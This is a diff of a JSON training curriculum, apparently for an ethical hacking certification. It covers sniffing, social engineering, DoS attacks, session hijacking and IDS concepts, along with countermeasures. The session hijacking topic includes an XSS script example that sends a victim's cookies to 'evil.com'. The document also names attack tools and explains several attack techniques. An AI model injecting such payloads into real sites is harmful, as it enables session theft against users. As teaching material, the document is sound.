+          "content": "<p>Switches maintain a Content Addressable Memory (CAM) table to map MAC addresses to physical ports.</p><ul><li><strong>MAC Flooding (CAM Table Exhaustion):</strong> An attacker floods the switch with thousands of forged Ethernet frames, each with a different fake source MAC address. This rapidly fills the CAM table. Once full, most switches fail-open and revert to behaving like a hub, broadcasting all incoming traffic out of every port. This allows the attacker to passively sniff traffic meant for other hosts. Tools like <strong>macof</strong> are commonly used for this.</li><li><strong>Switch Spoofing (VLAN Hopping):</strong> Attackers negotiate a trunk link with the switch (e.g., by exploiting DTP) to gain access to traffic from all VLANs.</li></ul>",
           "keyTerms": [
             "MAC Flooding",
             "CAM Table",
-            "Fail-Open",
-            "DHCP Spoofing",
-            "Rogue DHCP Server"
+            "Fail-open",
+            "macof",
+            "VLAN Hopping"
           ]
         },
         {
-          "title": "DNS Poisoning",
-          "content": "<p>DNS poisoning, or DNS cache poisoning, compromises the integrity of domain name resolution.</p><ul><li><strong>Mechanism:</strong> The attacker targets a recursive DNS resolver by sending forged DNS responses before the legitimate authoritative server can reply. This injects false records into the resolver's cache.</li><li><strong>Impact:</strong> Consequently, any subsequent user querying that poisoned resolver for the targeted domain (e.g., a bank's website) will be seamlessly redirected to the attacker's malicious server, facilitating severe phishing or malware delivery attacks.</li></ul>",
+          "title": "ARP, DHCP, and DNS Spoofing",
+          "content": "<p>These attacks manipulate fundamental network protocols to intercept traffic.</p><ul><li><strong>ARP Spoofing/Poisoning:</strong> Address Resolution Protocol (ARP) lacks authentication. An attacker sends spoofed ARP replies to a target and the default gateway, associating the attacker's MAC address with the gateway's IP address. This successfully establishes a <strong>Man-in-the-Middle (MitM)</strong> position.</li><li><strong>DHCP Starvation and Rogue DHCP:</strong> An attacker broadcasts thousands of DHCP requests with spoofed MAC addresses, exhausting the legitimate DHCP server's IP pool (starvation). They then introduce a <strong>Rogue DHCP server</strong> to assign IP addresses to clients, configuring the attacker's machine as the default gateway or DNS server.</li><li><strong>DNS Spoofing/Poisoning:</strong> The attacker intercepts DNS requests and replies with a spoofed IP address, redirecting the victim's traffic from a legitimate site (e.g., a bank) to an attacker-controlled malicious site.</li></ul>",
           "keyTerms": [
-            "DNS Poisoning",
-            "DNS Cache Poisoning",
-            "Recursive Resolver",
-            "Forged DNS Responses"
+            "ARP Spoofing",
+            "Man-in-the-Middle",
+            "DHCP Starvation",
+            "Rogue DHCP",
+            "DNS Spoofing"
           ]
         },
         {
           "title": "Sniffing Countermeasures",
-          "content": "<p>Defending against sniffing and Layer 2 attacks requires robust network configuration and encryption.</p><ul><li><strong>Dynamic ARP Inspection (DAI):</strong> To prevent ARP spoofing, managed switches can be configured with DAI. This security feature validates intercepted ARP packets against a trusted database (like a DHCP snooping binding table) and drops invalid IP-to-MAC bindings.</li><li><strong>DHCP Snooping:</strong> Prevents rogue DHCP servers by designating only specific switch ports as trusted for DHCP server messages.</li><li><strong>Port Security:</strong> Mitigates MAC flooding by limiting the number of secure MAC addresses permitted on a single switch port.</li></ul>",
+          "content": "<p>Defending against sniffing and active network manipulation requires network infrastructure security.</p><ul><li><strong>Dynamic ARP Inspection (DAI):</strong> Validates ARP packets in a network by intercepting, logging, and discarding ARP packets with invalid IP-to-MAC address bindings.</li><li><strong>Port Security:</strong> Mitigates MAC flooding by limiting the number of valid MAC addresses allowed on a specific switch port.</li><li><strong>DHCP Snooping:</strong> Prevents rogue DHCP servers by designating specific ports as 'trusted' (allowed to send DHCP replies) and all others as 'untrusted'.</li><li><strong>Encryption:</strong> Ensuring all network communication utilizes strong encryption (e.g., HTTPS, SSH, VPNs) renders captured packets unreadable to the attacker.</li></ul>",
           "keyTerms": [
             "Dynamic ARP Inspection",
-            "DAI",
+            "Port Security",
             "DHCP Snooping",
-            "Port Security"
+            "Encryption"
           ]
         }
       ],
       "tools": [
         "Wireshark",
+        "tcpdump",
         "Ettercap",
-        "macof",
-        "arpspoof"
+        "Bettercap",
+        "macof"
       ],
       "v13Updates": [
-        "Encrypted traffic analysis",
-        "ML-based anomaly detection"
+        "Advanced PCAP analysis with AI tools",
+        "IoT network sniffing techniques"
       ]
     },
     {
@@ -758,62 +765,74 @@
       "title": "Social Engineering",
       "domainId": 4,
       "icon": "users",
-      "description": "Explores human-based and computer-based social engineering attacks, including phishing, pretexting, impersonation, and the growing threat of AI-powered deepfakes.",
+      "description": "Explores the psychological manipulation of people to extract sensitive information, covering various attack vectors including phishing, deepfakes, physical techniques, and effective countermeasures.",
       "objectives": [
-        "Identify different types of social engineering attacks",
-        "Understand the psychology behind social engineering",
-        "Recognize phishing, spear phishing, and whaling techniques",
-        "Explain AI-powered social engineering threats including deepfakes",
-        "Implement social engineering countermeasures and awareness training"
+        "Understand the psychological principles of influence",
+        "Identify common social engineering attack vectors",
+        "Recognize the role of AI and deepfakes in modern attacks",
+        "Describe physical social engineering techniques",
+        "Implement comprehensive security awareness training"
       ],
       "topics": [
         {
-          "title": "Human-Based Social Engineering",
-          "content": "<p>Human-based attacks exploit psychological manipulation and direct human interaction to bypass technical security controls.</p><ul><li><strong>Tailgating / Piggybacking:</strong> A physical security breach where an unauthorized individual closely follows an authorized employee through a secured door or turnstile without presenting their own credentials.</li><li><strong>Pretexting:</strong> The attacker fabricates a compelling scenario or assumes a false identity (e.g., an auditor or IT technician) to manipulate the victim into divulging sensitive information or performing an action.</li><li><strong>Baiting:</strong> Exploits human curiosity. A classic example is leaving infected USB drives labeled with enticing titles (like 'Q4 Salary Information') in a company parking lot, hoping an employee will plug it into a corporate workstation.</li><li><strong>Psychological Principles:</strong> Attackers heavily rely on psychological triggers. The <em>Authority</em> principle is frequently used by impersonating executives or law enforcement to pressure victims into compliance. <em>Vishing</em> (voice phishing) calls often combine Authority, Urgency (a critical issue needs fixing), and Helpfulness (the victim's desire to assist support staff) to extract credentials.</li></ul>",
-          "keyTerms": [
-            "Tailgating",
-            "Pretexting",
-            "Baiting",
-            "Authority Principle",
-            "Vishing",
-            "Urgency"
-          ]
-        },
-        {
-          "title": "Phishing Attacks",
-          "content": "<p>Phishing remains one of the most prevalent and effective vectors for initial network compromise.</p><ul><li><strong>Phishing vs. Spear Phishing:</strong> General <em>phishing</em> casts a wide, untargeted net with generic fraudulent emails designed to look legitimate. <em>Spear phishing</em>, however, is highly customized and directed at specific individuals or organizations using thoroughly researched background information.</li><li><strong>Whaling and BEC:</strong> <em>Whaling</em> is a form of spear phishing targeting high-profile individuals like CEOs or CFOs. When attackers impersonate executives to authorize fraudulent financial transactions (e.g., referencing a recent board meeting to request an urgent wire transfer), it is classified as Business Email Compromise (BEC), resulting in massive financial losses globally.</li></ul>",
+          "title": "Social Engineering Concepts and Vectors",
+          "content": "<p>Social engineering relies on manipulating human psychology rather than exploiting technical flaws.</p><ul><li><strong>Phishing:</strong> The most common vector, involving mass fraudulent emails designed to trick users into revealing credentials or installing malware.</li><li><strong>Spear Phishing and Whaling:</strong> <em>Spear phishing</em> is highly targeted at specific individuals or organizations using customized information. <em>Whaling</em> is a specialized form of spear phishing that specifically targets high-profile executives (C-level).</li><li><strong>Vishing and Smishing:</strong> <em>Vishing</em> (voice phishing) leverages phone calls to deceive victims, often spoofing caller ID. <em>Smishing</em> uses SMS text messages containing malicious links.</li><li><strong>Pretexting:</strong> The attacker creates a fabricated scenario (the pretext) to compel the victim to divulge information or perform an action.</li></ul>",
           "keyTerms": [
             "Phishing",
             "Spear Phishing",
             "Whaling",
-            "BEC",
-            "Business Email Compromise"
+            "Vishing",
+            "Smishing",
+            "Pretexting"
           ]
         },
         {
-          "title": "AI-Powered Social Engineering & Deepfakes",
-          "content": "<p>The integration of Artificial Intelligence has dramatically elevated the sophistication of social engineering attacks.</p><ul><li><strong>Deepfakes and Impersonation:</strong> Attackers now utilize AI-generated deepfake technology to create hyper-realistic video and audio. A prominent emerging threat involves deepfake video calls where attackers convincingly impersonate a company's CEO to instruct finance departments to execute massive, unauthorized wire transfers.</li><li><strong>Impact:</strong> This threat represents a dangerous convergence of deepfake technology, the psychological principle of authority, and sophisticated impersonation, rendering traditional verification methods obsolete.</li></ul>",
+          "title": "Psychological Principles of Influence",
+          "content": "<p>Effective social engineers exploit human nature using core psychological principles.</p><ul><li><strong>Authority:</strong> People are conditioned to obey authority figures. An attacker might impersonate a CEO, IT Director, or law enforcement officer to force compliance.</li><li><strong>Urgency and Scarcity:</strong> Creating a false sense of urgency (e.g., 'Your account will be suspended in 24 hours') prevents the victim from thinking critically and forces immediate action.</li><li><strong>Consensus (Social Proof):</strong> Influencing a target by suggesting that others in the organization have already complied with the request.</li><li><strong>Familiarity (Liking):</strong> People are more likely to comply with requests from people they know or like. Attackers use compromised accounts of colleagues to leverage this trust.</li></ul>",
+          "keyTerms": [
+            "Authority",
+            "Urgency",
+            "Scarcity",
+            "Consensus",
+            "Familiarity"
+          ]
+        },
+        {
+          "title": "Deepfakes and AI in Social Engineering",
+          "content": "<p>The integration of Artificial Intelligence has dramatically elevated the sophistication of social engineering.</p><ul><li><strong>Synthetic Media (Deepfakes):</strong> Attackers use deep learning algorithms to create highly convincing, fake audio or video of real people.</li><li><strong>AI Impersonation (Vishing 2.0):</strong> Attackers can clone a CEO's voice using a small sample of public audio and use it in real-time phone calls to authorize fraudulent wire transfers (Business Email Compromise or BEC attacks). Real-world incidents have demonstrated multi-million dollar losses from deepfake-enabled social engineering.</li><li><strong>AI-Generated Phishing:</strong> LLMs are now used to rapidly generate flawless, highly personalized spear-phishing emails devoid of the traditional spelling and grammar errors that previously served as red flags.</li></ul>",
           "keyTerms": [
             "Deepfakes",
-            "Voice Cloning",
+            "Business Email Compromise (BEC)",
             "AI Impersonation",
             "Synthetic Media"
           ]
         },
         {
+          "title": "Physical Social Engineering",
+          "content": "<p>Attackers also leverage physical access to bypass technical security perimeters.</p><ul><li><strong>Tailgating and Piggybacking:</strong> <em>Tailgating</em> occurs when an unauthorized person closely follows an authorized person into a secure area without their knowledge. <em>Piggybacking</em> is similar but typically implies the authorized person is aware and holds the door out of courtesy.</li><li><strong>Dumpster Diving:</strong> Searching through organizational trash for sensitive documents, organizational charts, hardware manuals, or old storage media. It is a critical information gathering technique.</li><li><strong>Shoulder Surfing:</strong> Directly observing a target entering passwords or viewing sensitive information on a screen.</li></ul>",
+          "keyTerms": [
+            "Tailgating",
+            "Piggybacking",
+            "Dumpster Diving",
+            "Shoulder Surfing"
+          ]
+        },
+        {
           "title": "Social Engineering Countermeasures",
-          "content": "<p>Because social engineering targets human psychology rather than software flaws, defense requires a combination of education, testing, and strict policies.</p><ul><li><strong>Primary Defenses:</strong> The most effective countermeasures include comprehensive, regular security awareness training and conducting periodic phishing simulations to test and educate the workforce.</li><li><strong>Verification Procedures:</strong> For highly targeted attacks like BEC and deepfake impersonations, organizations must implement strict, out-of-band verification procedures (like requiring a separate phone call to an established number) for any significant financial transactions or sensitive data transfers.</li></ul>",
+          "content": "<p>Because social engineering targets human psychology rather than software flaws, defense requires a combination of education, testing, and strict policies.</p><ul><li><strong>Primary Defenses:</strong> The most effective countermeasures include comprehensive, regular <strong>security awareness training</strong> and conducting periodic <strong>phishing simulations</strong> to test and educate the workforce on identifying modern threats.</li><li><strong>Verification Procedures:</strong> For highly targeted attacks like BEC and deepfake impersonations, organizations must implement strict, <strong>out-of-band verification procedures</strong> (like requiring a separate phone call to an established, known internal number) for any significant financial transactions or sensitive data transfers.</li><li><strong>Zero Trust Architecture:</strong> Enforcing a 'never trust, always verify' model minimizes the blast radius if an employee's account is compromised via social engineering.</li></ul>",
           "keyTerms": [
             "Security Awareness Training",
             "Phishing Simulations",
-            "Out-of-band Verification"
+            "Out-of-band Verification",
+            "Zero Trust"
           ]
         }
       ],
       "tools": [
         "Social Engineering Toolkit (SET)",
         "GoPhish",
-        "Deepfake Generation Tools"
+        "Deepfake Generation Tools",
+        "Maltego"
       ],
       "v13Updates": [
         "AI-generated phishing at scale",
@@ -836,7 +855,7 @@
       "topics": [
         {
           "title": "DoS vs. DDoS and Botnets",
-          "content": "<p>Denial-of-Service attacks aim to render a target system, network, or application unavailable to its legitimate users.</p><ul><li><strong>DoS vs. DDoS:</strong> A Denial-of-Service (DoS) attack originates from a single source system. In contrast, a Distributed Denial-of-Service (DDoS) attack leverages multiple distributed, compromised systems to simultaneously flood the target, making it vastly more powerful and difficult to block using simple IP blacklists.</li><li><strong>Botnets:</strong> DDoS attacks are typically executed using a botnet—a massive network of compromised computers or IoT devices (zombies) controlled remotely by a botmaster. The infamous <strong>Mirai botnet</strong> notoriously targeted Linux-based IoT devices (like cameras and routers) by exploiting factory-default credentials over open Telnet ports.</li></ul>",
+          "content": "<p>Denial-of-Service attacks aim to render a target system, network, or application unavailable to its legitimate users.</p><ul><li><strong>DoS vs. DDoS:</strong> A Denial-of-Service (DoS) attack originates from a single source system. In contrast, a Distributed Denial-of-Service (DDoS) attack leverages multiple distributed, compromised systems to simultaneously flood the target, making it vastly more powerful and difficult to block using simple IP blacklists.</li><li><strong>Botnets:</strong> DDoS attacks are typically executed using a botnet—a massive network of compromised computers or IoT devices (zombies) controlled remotely by a botmaster through a Command and Control (C2) infrastructure. The infamous <strong>Mirai botnet</strong> notoriously targeted Linux-based IoT devices (like cameras and routers) by exploiting factory-default credentials over open Telnet ports.</li></ul>",
           "keyTerms": [
             "DoS",
             "DDoS",
@@ -848,18 +867,29 @@
         },
         {
           "title": "Volumetric and Protocol Attacks",
-          "content": "<p>These attacks focus on exhausting network bandwidth or the processing capacity of network infrastructure.</p><ul><li><strong>SYN Flood:</strong> A classic protocol attack that exploits the TCP three-way handshake. The attacker sends a massive volume of SYN requests but intentionally never completes the final ACK. The server allocates connection state resources for these half-open connections, eventually exhausting its connection table and crashing.</li><li><strong>Smurf Attack:</strong> An attacker sends ICMP echo requests (pings) to a network's broadcast address, but spoofs the source IP address to be that of the victim. Every host on the broadcast network replies to the victim, creating a massive amplification of traffic.</li><li><strong>DNS Amplification:</strong> The attacker sends small DNS queries to open recursive resolvers with the victim's IP spoofed as the source. Because DNS responses (especially with DNSSEC) are significantly larger than the queries (often 28-54 times larger), the resolvers flood the victim with massive responses. For example, high volumes of UDP packets targeting port 53 with large response sizes strongly characterize a DNS amplification attack.</li></ul>",
+          "content": "<p>These attacks focus on exhausting network bandwidth or the processing capacity of network infrastructure.</p><ul><li><strong>SYN Flood:</strong> A classic protocol attack that exploits the TCP three-way handshake. The attacker sends a massive volume of SYN requests but intentionally never completes the final ACK. The server allocates connection state resources for these half-open connections, eventually exhausting its connection table and crashing.</li><li><strong>Smurf Attack:</strong> An attacker sends ICMP echo requests (pings) to a network's broadcast address, but spoofs the source IP address to be that of the victim. Every host on the broadcast network replies to the victim, creating a massive amplification of traffic.</li></ul>",
           "keyTerms": [
             "SYN Flood",
             "Smurf Attack",
+            "Half-open Connections",
+            "ICMP Broadcast"
+          ]
+        },
+        {
+          "title": "Amplification and Reflection Attacks",
+          "content": "<p>Amplification attacks exploit vulnerabilities in UDP-based protocols to reflect a large volume of traffic onto a victim using a very small initial request.</p><ul><li><strong>DNS Amplification:</strong> The attacker sends small DNS queries to open recursive resolvers with the victim's IP spoofed as the source. Because DNS responses (especially with DNSSEC or ANY queries) are significantly larger than the queries (often 28-54 times larger), the resolvers flood the victim with massive responses. High volumes of UDP packets targeting port 53 with large response sizes characterize a DNS amplification attack.</li><li><strong>NTP Amplification:</strong> Exploits the <code>monlist</code> command in older NTP servers to return a large list of recently connected hosts, achieving an amplification factor of up to 556x.</li></ul>",
+          "keyTerms": [
+            "Amplification Attack",
+            "Reflection Attack",
             "DNS Amplification",
             "Spoofed Source IP",
-            "UDP Port 53"
+            "UDP Port 53",
+            "NTP Amplification"
           ]
         },
         {
           "title": "Application Layer Attacks",
-          "content": "<p>Layer 7 (Application Layer) attacks are designed to exhaust the resources of specific applications or web servers rather than raw network bandwidth.</p><ul><li><strong>HTTP Floods (Slowloris and RUDY):</strong> These attacks send seemingly legitimate HTTP requests that consume server resources. <em>Slowloris</em> operates by sending partial HTTP requests very slowly to keep numerous connections open on the web server, eventually exhausting the server's concurrent connection pool without requiring high attacker bandwidth.</li></ul>",
+          "content": "<p>Layer 7 (Application Layer) attacks are designed to exhaust the resources of specific applications or web servers rather than raw network bandwidth. They can be highly effective with relatively low volumes of traffic.</p><ul><li><strong>HTTP Floods:</strong> These attacks send seemingly legitimate HTTP requests that consume server resources, blending in with legitimate traffic.</li><li><strong>Slowloris:</strong> This attack operates by sending partial HTTP requests very slowly to keep numerous connections open on the web server. By never completing the request, it eventually exhausts the server's concurrent connection pool without requiring high attacker bandwidth.</li><li><strong>RUDY (R-U-Dead-Yet):</strong> Similar to Slowloris, but works by sending an HTTP POST request with a very large <code>Content-Length</code> header, and then sending the actual data at an extremely slow rate (e.g., one byte at a time).</li></ul>",
           "keyTerms": [
             "Application Layer",
             "Layer 7",
@@ -870,12 +900,13 @@
         },
         {
           "title": "DoS/DDoS Countermeasures",
-          "content": "<p>Mitigating modern DDoS attacks requires robust infrastructure and specialized techniques.</p><ul><li><strong>Content Delivery Networks (CDNs):</strong> Deploying a CDN (like Cloudflare or Akamai) is a highly effective defense against DDoS. CDNs distribute web traffic across massive global networks of edge servers, successfully absorbing volumetric attacks and filtering out malicious requests before they can ever reach the origin server.</li><li><strong>SYN Cookies:</strong> To defend specifically against SYN floods, servers can implement SYN cookies. Instead of allocating memory for every incoming SYN request, the server encodes the connection state into the TCP sequence number of the SYN-ACK response. It only allocates resources if a valid final ACK is received, completely neutralizing the resource exhaustion vector of the attack.</li></ul>",
+          "content": "<p>Mitigating modern DDoS attacks requires robust infrastructure and specialized techniques.</p><ul><li><strong>Content Delivery Networks (CDNs):</strong> Deploying a CDN (like Cloudflare or Akamai) is a highly effective defense against DDoS. CDNs distribute web traffic across massive global networks of edge servers, successfully absorbing volumetric attacks and filtering out malicious requests before they can ever reach the origin server.</li><li><strong>SYN Cookies:</strong> To defend specifically against SYN floods, servers can implement SYN cookies. Instead of allocating memory for every incoming SYN request, the server encodes the connection state into the TCP sequence number of the SYN-ACK response. It only allocates resources if a valid final ACK is received, neutralizing the resource exhaustion vector.</li><li><strong>Ingress Filtering (BCP38):</strong> ISPs implement ingress filtering to drop packets with spoofed source IPs that don't belong to the transmitting network, fundamentally stopping reflection and amplification attacks.</li></ul>",
           "keyTerms": [
             "CDN",
             "Traffic Filtering",
             "SYN Cookies",
-            "Connection State"
+            "Ingress Filtering",
+            "BCP38"
           ]
         }
       ],
@@ -883,7 +914,8 @@
         "LOIC",
         "HOIC",
         "Slowloris",
-        "hping3"
+        "hping3",
+        "RUDY"
       ],
       "v13Updates": [
         "AI-driven adaptive DDoS attacks",
@@ -895,54 +927,62 @@
       "title": "Session Hijacking",
       "domainId": 4,
       "icon": "link",
-      "description": "Covers techniques for intercepting and taking over authenticated user sessions at both the network and application level, including session token prediction, XSS-based theft, and session fixation.",
+      "description": "Covers techniques for intercepting and taking over authenticated user sessions at both the network and application level, including session token prediction, XSS-based theft, session fixation, and blind hijacking.",
       "objectives": [
         "Understand session hijacking concepts at network and application layers",
         "Explain session token prediction and brute-forcing techniques",
         "Perform XSS-based session theft and session fixation attacks",
         "Describe man-in-the-browser and cross-site request forgery attacks",
-        "Implement session management countermeasures"
+        "Implement session management countermeasures",
+        "Analyze CRIME and BREACH attacks on compressed HTTPS sessions"
       ],
       "topics": [
         {
           "title": "Session Hijacking Concepts",
-          "content": "<p><strong>Session hijacking</strong> aims to take over an established session between a user and a server by stealing, predicting, or manipulating a valid session token. This allows the attacker to impersonate the legitimate user without needing their credentials directly. Hijacking occurs at both the network layer and the application layer.</p><ul><li><strong>Active Hijacking:</strong> Taking over an existing session and interacting with the server.</li><li><strong>Passive Hijacking:</strong> Monitoring the session silently.</li></ul>",
+          "content": "<p><strong>Session hijacking</strong> aims to take over an established session between a user and a server by stealing, predicting, or manipulating a valid session token. This allows the attacker to impersonate the legitimate user without needing their credentials directly. Hijacking occurs at both the network layer and the application layer.</p><ul><li><strong>Active Hijacking:</strong> Taking over an existing session and interacting with the server. Typically involves silencing the client using DoS or ARP spoofing to prevent RST packets.</li><li><strong>Passive Hijacking:</strong> Monitoring the session silently to capture data, such as sniffing unencrypted cookies.</li><li><strong>Blind Hijacking:</strong> An attacker injects malicious data into an authenticated session without being able to see the response (often because they are not on the same network segment).</li></ul>",
           "keyTerms": [
             "Session Hijacking",
             "Session Token",
             "Active Hijacking",
-            "Passive Hijacking"
+            "Passive Hijacking",
+            "Blind Hijacking"
           ]
         },
         {
           "title": "Application-Level Session Attacks",
-          "content": "<p>Application-level hijacking targets session mechanisms (cookies, URL parameters, hidden form fields).</p><ul><li><strong>Session Fixation:</strong> The attacker forces a predetermined, known session ID onto a victim before they authenticate. If the server regenerates the session ID after successful login but <em>fails to invalidate the old session ID</em>, the attacker can continue using the fixed ID to access the authenticated session.</li><li><strong>Session Prediction:</strong> Exploits weak token generation algorithms. For instance, tokens constructed from predictable values like a username plus a current timestamp (e.g., <code>admin1689456000</code>) are highly vulnerable to session prediction attacks.</li><li><strong>XSS-based Cookie Theft:</strong> Stored XSS attacks can steal session cookies. An attacker injects a malicious script (e.g., <code>&lt;script&gt;document.location='http://evil.com/steal.php?c='+document.cookie;&lt;/script&gt;</code>) that reads the victim's cookies via <code>document.cookie</code> and sends them to the attacker.</li><li><strong>Man-in-the-Browser (MitB):</strong> A Trojan operates inside the victim's browser process, intercepting and modifying web page content and transactions in real-time <em>before</em> they are encrypted by SSL/TLS. This defeats HTTPS protections.</li><li><strong>Session Replay:</strong> Attackers use proxy tools like <strong>Burp Suite</strong> to intercept and replay a session token captured from an authenticated user.</li></ul>",
+          "content": "<p>Application-level hijacking targets session mechanisms (cookies, URL parameters, hidden form fields).</p><ul><li><strong>Session Fixation:</strong> The attacker forces a predetermined, known session ID onto a victim before they authenticate. If the server regenerates the session ID after successful login but <em>fails to invalidate the old session ID</em>, the attacker can continue using the fixed ID to access the authenticated session.</li><li><strong>Session Prediction:</strong> Exploits weak token generation algorithms. Tokens constructed from predictable values like a username plus a current timestamp (e.g., <code>admin1689456000</code>), or using non-cryptographic RNGs, are highly vulnerable to session prediction attacks.</li><li><strong>XSS-based Cookie Theft:</strong> Stored or reflected XSS attacks can steal session cookies. An attacker injects a malicious script (e.g., <code>&lt;script&gt;new Image().src='http://evil.com/steal?c='+document.cookie;&lt;/script&gt;</code>) that reads the victim's cookies via <code>document.cookie</code> and exfiltrates them.</li><li><strong>Man-in-the-Browser (MitB):</strong> A Trojan operates inside the victim's browser process, intercepting and modifying web page content and transactions in real-time <em>before</em> they are encrypted by SSL/TLS. This defeats HTTPS protections.</li><li><strong>Session Replay:</strong> Attackers use proxy tools like <strong>Burp Suite</strong> to intercept and replay a session token captured from an authenticated user.</li><li><strong>CRIME and BREACH:</strong> These attacks exploit data compression (like gzip) in TLS and HTTP respectively. By injecting plaintext into a session and observing changes in the compressed payload size, attackers can deduce the contents of secret session cookies.</li></ul>",
           "keyTerms": [
             "Session Fixation",
             "Session Prediction",
             "Session Replay",
             "XSS Cookie Theft",
-            "MitB"
+            "MitB",
+            "CRIME Attack",
+            "BREACH Attack"
           ]
         },
         {
           "title": "Network-Level Session Hijacking",
-          "content": "<p>Network-level session hijacking involves intercepting transport-layer connections.</p><ul><li><strong>TCP Session Hijacking:</strong> To successfully inject packets into an active TCP session, the attacker must accurately predict the <strong>TCP sequence numbers</strong> being used. TCP uses these sequence numbers to ensure packets are received in order; incorrect sequence numbers result in the packets being dropped.</li><li><strong>Network Sniffing:</strong> Attackers use network protocol analyzers like <strong>Wireshark</strong> to sniff network traffic and extract session cookies from unencrypted HTTP communications. Historically, tools like Ferret and Hamster were also used for this purpose.</li></ul>",
+          "content": "<p>Network-level session hijacking involves intercepting transport-layer connections.</p><ul><li><strong>TCP Session Hijacking:</strong> To successfully inject packets into an active TCP session, the attacker must accurately predict the <strong>TCP sequence numbers (SEQ) and acknowledgment numbers (ACK)</strong> being used. TCP uses these sequence numbers to ensure packets are received in order; incorrect sequence numbers result in the packets being dropped or triggering RST (Reset) packets.</li><li><strong>ARP Spoofing/Poisoning:</strong> Frequently used as a precursor to network session hijacking. By broadcasting forged ARP replies, an attacker associates their MAC address with the IP address of the default gateway, enabling a Man-in-the-Middle (MitM) position to intercept and modify TCP traffic.</li><li><strong>Network Sniffing:</strong> Attackers use network protocol analyzers like <strong>Wireshark</strong> to sniff network traffic and extract session cookies from unencrypted HTTP communications or poorly implemented HTTPS configurations (e.g., via SSL stripping).</li></ul>",
           "keyTerms": [
             "TCP Hijacking",
             "Sequence Number Prediction",
-            "Wireshark",
+            "ARP Spoofing",
+            "Man-in-the-Middle (MitM)",
             "Network Sniffing"
           ]
         },
         {
           "title": "Session Hijacking Countermeasures",
-          "content": "<p>Securing sessions requires multiple defense-in-depth strategies:</p><ul><li><strong>Secure Token Generation:</strong> Session tokens should be generated using cryptographically secure random number generators to thwart session prediction attacks.</li><li><strong>Regeneration & Invalidation:</strong> To prevent session fixation, servers must regenerate the session ID <em>and</em> invalidate the pre-authentication session ID upon login.</li><li><strong>HttpOnly Flag:</strong> Setting the <strong>HttpOnly</strong> attribute on session cookies instructs the browser to prevent client-side scripts (like JavaScript) from accessing the cookie, serving as a critical defense against XSS-based session theft.</li><li><strong>Token Binding:</strong> Binding the session to additional client-specific attributes (such as IP address, User-Agent string, and device fingerprint) makes stolen session tokens much harder to reuse from a different machine.</li><li><strong>Avoid URL-based Tracking:</strong> URL-based session tracking is insecure because tokens can easily leak through HTTP Referer headers or browser history.</li></ul>",
+          "content": "<p>Securing sessions requires multiple defense-in-depth strategies:</p><ul><li><strong>Secure Token Generation:</strong> Session tokens should be generated using cryptographically secure pseudorandom number generators (CSPRNG) with sufficient entropy (length) to thwart session prediction and brute-forcing.</li><li><strong>Regeneration & Invalidation:</strong> To prevent session fixation, servers must regenerate the session ID <em>and</em> explicitly invalidate the pre-authentication session ID upon successful login.</li><li><strong>HttpOnly Flag:</strong> Setting the <strong>HttpOnly</strong> attribute on session cookies instructs the browser to prevent client-side scripts (like JavaScript) from accessing the cookie, serving as a critical defense against XSS-based session theft.</li><li><strong>Secure and SameSite Flags:</strong> The <code>Secure</code> flag ensures cookies are only transmitted over encrypted (HTTPS) connections. The <code>SameSite</code> attribute protects against CSRF and cross-site tracking by controlling when cookies are sent with cross-site requests.</li><li><strong>Token Binding and Fingerprinting:</strong> Binding the session to additional client-specific attributes (such as IP address, User-Agent string, and TLS client certificate) makes stolen session tokens much harder to reuse from a different machine.</li><li><strong>Avoid URL-based Tracking:</strong> URL-based session tracking (passing session IDs in GET parameters) is insecure because tokens can easily leak through HTTP Referer headers, proxy logs, or browser history.</li><li><strong>HSTS and Encryption:</strong> Implement <strong>HTTP Strict Transport Security (HSTS)</strong> to mandate HTTPS connections, preventing downgrade attacks like SSL stripping. Use strong encryption protocols (IPsec, VPNs, TLS 1.3) to protect data in transit.</li></ul>",
           "keyTerms": [
             "HttpOnly",
+            "Secure Flag",
+            "SameSite Attribute",
             "Session Regeneration",
             "Token Binding",
-            "Secure RNG"
+            "Secure RNG",
+            "HSTS"
           ]
         }
       ],
@@ -951,11 +991,13 @@
         "OWASP ZAP",
         "Wireshark",
         "Bettercap",
-        "Ettercap"
+        "Ettercap",
+        "TCPdump"
       ],
       "v13Updates": [
         "AI-based session anomaly detection",
-        "Advanced token prediction with machine learning"
+        "Advanced token prediction with machine learning",
+        "Modern SSO and OAuth hijacking techniques"
       ]
     },
     {
@@ -966,52 +1008,58 @@
       "description": "Explains how intrusion detection systems, firewalls, and honeypots work, and covers various evasion techniques used by attackers to bypass these security controls.",
       "objectives": [
         "Understand IDS, IPS, and firewall architectures and detection methods",
-        "Perform IDS evasion using fragmentation, obfuscation, and encryption",
-        "Bypass firewall rules using tunneling and covert channels",
+        "Perform IDS evasion using fragmentation, obfuscation, encryption, and desynchronization",
+        "Bypass firewall rules using tunneling, covert channels, and source routing",
         "Identify and evade honeypots and honeynets",
         "Understand NAC and endpoint security evasion"
       ],
       "topics": [
         {
-          "title": "IDS/IPS Concepts",
-          "content": "<p>An <strong>Intrusion Detection System (IDS)</strong> is designed to monitor network traffic or system activities and generate alerts when suspicious or malicious behavior is detected. Unlike an Intrusion Prevention System (IPS), a standard IDS does not actively block traffic; it only detects and alerts administrators.</p><p><strong>IDS Sensor Placement:</strong> For maximum visibility into incoming threats, an IDS sensor should be connected to a <strong>SPAN (Switched Port Analyzer) or mirror port</strong> on the border router or just inside the firewall. This allows the IDS to passively see copies of all traffic entering and leaving the network without affecting network performance.</p>",
+          "title": "IDS/IPS and Firewall Concepts",
+          "content": "<p>Security monitoring and filtering rely on proper placement and configuration of defensive appliances.</p><p><strong>Intrusion Detection System (IDS):</strong> Monitors network traffic or system activities and generates alerts when suspicious behavior is detected based on signatures (pattern matching) or anomalies (deviations from baselines). An IDS passively monitors and does not block traffic. <strong>Intrusion Prevention System (IPS):</strong> Sits inline with traffic and can actively drop malicious packets.</p><p><strong>IDS Sensor Placement:</strong> For maximum visibility, an IDS sensor should be connected to a <strong>SPAN (Switched Port Analyzer) or mirror port</strong> on a switch, or via a network tap. This allows it to passively see copies of all traffic without introducing latency.</p><p><strong>Firewalls:</strong> Filter traffic based on rules. Types include Packet Filtering (L3/L4 headers), Stateful Inspection (tracks connection state), and Application-Level Gateways (WAFs analyzing HTTP data). <strong>Demilitarized Zones (DMZ)</strong> isolate public-facing servers from internal networks.</p>",
           "keyTerms": [
             "IDS",
             "IPS",
             "SPAN Port",
             "Mirror Port",
-            "Passive Monitoring"
+            "Passive Monitoring",
+            "Stateful Firewall",
+            "DMZ"
           ]
         },
         {
           "title": "IDS Evasion Techniques",
